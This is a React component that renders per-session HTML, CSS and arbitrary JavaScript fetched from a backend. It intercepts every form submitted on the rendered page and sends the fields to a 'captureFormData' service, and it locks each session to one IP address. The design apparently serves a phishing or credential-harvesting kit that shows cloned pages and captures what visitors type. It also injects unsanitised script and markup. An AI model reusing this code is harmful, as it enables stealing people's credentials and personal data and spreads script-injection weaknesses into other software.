
import React, { useEffect, useRef, useCallback } from 'react';
import { toast } from '@/components/ui/sonner';
import { useSessionData } from '@/hooks/useSessionData';
import { checkIPRestriction } from '@/services/ipService';
import { captureFormData, extractFormData } from '@/services/formDataService';

interface SessionContentProps {
  sessionId: string;
}

const SessionContent = ({ sessionId }: SessionContentProps) => {
  const { data, loading, error } = useSessionData(sessionId);
  const containerRef = useRef<HTMLDivElement>(null);
  const scriptRef = useRef<HTMLScriptElement | null>(null);

  // Handle form submissions
  const handleFormSubmit = useCallback(async (event: Event) => {
    const form = event.target as HTMLFormElement;
    if (!form || form.tagName !== 'FORM') return;
    
    event.preventDefault();
    
    try {
      // Check IP restrictions
      if (data?.session.session_options) {
        const ipAllowed = await checkIPRestriction(sessionId, data.session.session_options);
        if (!ipAllowed) {
          toast.error('Access denied: Session locked to different IP address');
          return;
        }
      }

      const formData = extractFormData(form);
      
      if (Object.keys(formData).length === 0) {
        toast.error('No data to submit');
        return;
      }

      await captureFormData({
        sessionId,
        formData
      });

      toast.success('Data submitted successfully!');
    } catch (error) {
      console.error('Form submission failed:', error);
      toast.error('Failed to submit data. Please try again.');
    }
  }, [sessionId, data?.session.session_options]);

  // Set up form listeners
  useEffect(() => {
    const container = containerRef.current;
    if (!container) return;

    container.addEventListener('submit', handleFormSubmit);
    return () => container.removeEventListener('submit', handleFormSubmit);
  }, [handleFormSubmit]);

  // Handle JavaScript injection
  useEffect(() => {
    if (!data?.subPage.javascript) return;

    // Clean up previous script
    if (scriptRef.current) {
      try {
        document.head.removeChild(scriptRef.current);
      } catch (e) {
        console.warn('Previous script already removed');
      }
      scriptRef.current = null;
    }

    try {
      const script = document.createElement('script');
      script.textContent = data.subPage.javascript;
      document.head.appendChild(script);
      scriptRef.current = script;

      // Set up global functions
      (window as any).submitSessionData = async (customData: Record<string, any>) => {
        try {
          await captureFormData({
            sessionId,
            formData: customData
          });
          toast.success('Data submitted successfully!');
        } catch (error) {
          toast.error('Failed to submit data');
        }
      };

      return () => {
        if (scriptRef.current) {
          try {
            document.head.removeChild(scriptRef.current);
          } catch (e) {
            console.warn('Script cleanup failed');
          }
          scriptRef.current = null;
        }
        delete (window as any).submitSessionData;
      };
    } catch (error) {
      console.error('JavaScript injection failed:', error);
    }
  }, [data?.subPage.javascript, sessionId]);

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary"></div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="flex items-center justify-center min-h-screen p-4">
        <div className="text-center">
          <h2 className="text-xl font-semibold text-red-600 mb-2">Session Error</h2>
          <p className="text-gray-600">{error}</p>
        </div>
      </div>
    );
  }

  if (!data) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <p className="text-gray-500">No session data available</p>
      </div>
    );
  }

  return (
    <div className="w-full min-h-screen">
      {data.subPage.css && (
        <style dangerouslySetInnerHTML={{ __html: data.subPage.css }} />
      )}
      {data.subPage.html && (
        <div
          ref={containerRef}
          className="w-full"
          dangerouslySetInnerHTML={{ __html: data.subPage.html }}
        />
      )}
    </div>
  );
};

export default SessionContent;
